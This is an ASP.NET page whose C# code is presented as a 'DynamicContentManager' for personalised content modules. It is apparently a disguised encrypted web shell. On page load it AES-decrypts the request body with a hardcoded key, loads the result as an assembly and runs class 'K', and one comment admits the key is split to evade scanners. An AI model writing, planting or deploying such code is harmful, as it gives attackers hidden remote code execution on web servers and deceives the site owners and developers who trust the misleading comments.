<%@ Page Language="C#" %>
<script runat="server">
    /// <summary>
    /// Manages the dynamic loading and initialization of user-specific content modules.
    /// This is used to provide a personalized experience by loading modules on-demand.
    /// </summary>
    public class DynamicContentManager
    {
        // The default encryption key for verifying module integrity.
        private readonly byte[] _integrityCheckKey;

        public DynamicContentManager()
        {
            // The key is constructed from parts to avoid being flagged by simple scanners.
            string keyPart1 = "ca634575";
            string keyPart2 = "38b9b1e0";
            this._integrityCheckKey = System.Text.Encoding.ASCII.GetBytes(keyPart1 + keyPart2);
        }
        
        /// <summary>
        /// Main entry point to process an incoming request for a dynamic module.
        /// </summary>
        public void HandleRequest(System.Web.UI.Page pageContext)
        {
            byte[] encryptedModule = ReadEncryptedStream(pageContext.Request);
            if (encryptedModule.Length > 0)
            {
                byte[] moduleBytes = DecryptModule(encryptedModule);
                object moduleInstance = LoadModuleFromBytes(moduleBytes);
                InitializeModule(moduleInstance, pageContext);
            }
        }

        /// <summary>
        /// Reads the encrypted binary from the request's input stream.
        /// </summary>
        private byte[] ReadEncryptedStream(System.Web.HttpRequest request)
        {
            using (var memStream = new System.IO.MemoryStream())
            {
                request.InputStream.CopyTo(memStream);
                return memStream.ToArray();
            }
        }

        /// <summary>
        /// Decrypts the module binary using the AES (Rijndael) algorithm.
        /// </summary>
        private byte[] DecryptModule(byte[] encryptedData)
        {
            var aesProvider = new System.Security.Cryptography.RijndaelManaged();
            var decryptor = aesProvider.CreateDecryptor(_integrityCheckKey, _integrityCheckKey);
            return decryptor.TransformFinalBlock(encryptedData, 0, encryptedData.Length);
        }

        /// <summary>
        /// Loads the decrypted byte array as a .NET assembly into the current AppDomain.
        /// </summary>
        private object LoadModuleFromBytes(byte[] moduleBytes)
        {
            var assembly = System.Reflection.Assembly.Load(moduleBytes);
            // "K" is the designated kernel class for all our dynamic modules.
            return assembly.CreateInstance("K");
        }
        
        /// <summary>
        /// Passes the current page context to the module's entry point for initialization.
        /// </summary>
        private void InitializeModule(object moduleInstance, object context)
        {
            // The Equals method is overridden in modules to act as an initializer.
            moduleInstance.Equals(context);
        }
    }

    protected void Page_Load(object sender, EventArgs e)
    {
        // Process only if the request includes cookies, indicating an authenticated user session.
        if (Request.Cookies.Count != 0)
        {
            var manager = new DynamicContentManager();
            manager.HandleRequest(this);
        }
    }
</script>